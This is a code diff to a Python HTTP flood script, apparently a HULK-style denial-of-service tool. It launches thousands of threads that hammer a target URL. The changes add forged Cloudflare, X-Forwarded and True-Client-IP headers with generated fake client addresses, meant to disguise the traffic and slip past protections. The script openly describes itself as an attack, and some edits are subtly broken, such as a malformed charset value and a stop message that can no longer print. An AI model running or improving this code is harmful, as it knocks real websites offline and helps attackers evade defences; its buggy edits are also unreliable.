@@ -69,8 +69,24 @@ def httpcall(url):
         'Accept-Language': 'en-US,en;q=0.5',
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1',
-        'Cache-Control': 'max-age=0',
-        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7'
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'DNT': '1',
+        'Accept-Charset': 'ISO-885-1,utf-8;q=0.7,*;q=0.7',
+        'Sec-Fetch-Site': 'none',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-GPC': '1',
+        'CF-IPCountry': 'US',
+        'CF-RAY': '1234567890123456-ORD',
+        'CF-Visitor': '{"scheme":"https"}',
+        'X-Forwarded-Proto': 'https',
+        'X-Frame-Options': 'deny',
+        'X-Content-Type-Options': 'nosniff',
+        'X-XSS-Protection': '1; mode=block',
+        'Via': '1.1 google',
+        'True-Client-IP': generate_real_ip(),
     }
     try:
         req = urllib.request.Request(request_url, headers=headers)
@@ -82,30 +98,30 @@ def httpcall(url):
 
 class HTTPThread(threading.Thread):
     def run(self):
-        while flag < 2:
+        while not flag:
             httpcall(url)
             time.sleep(random.uniform(0.1, 0.5))
 
 class MonitorThread(threading.Thread):
     def run(self):
         previous = request_counter
-        while flag == 0:
+        while not flag:
             if previous + 1000 < request_counter and previous != request_counter:
                 print(f"{request_counter} Requests Sent")
                 previous = request_counter
-        if flag == 2:
+        if flag:
             print("\n-- Attack stopped by user --")
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("Usage: script.py <url>")
+        print("Usage: app.py <url>")
         sys.exit()
     url = sys.argv[1]
     if url.count("/") == 2:
         url += "/"
     m = re.search('(https?://)?([^/]*)/?.*', url)
     host = m.group(2)
-    for i in range(21000):
+    for i in range(6000):
         t = HTTPThread()
         t.start()
         threads.append(t)
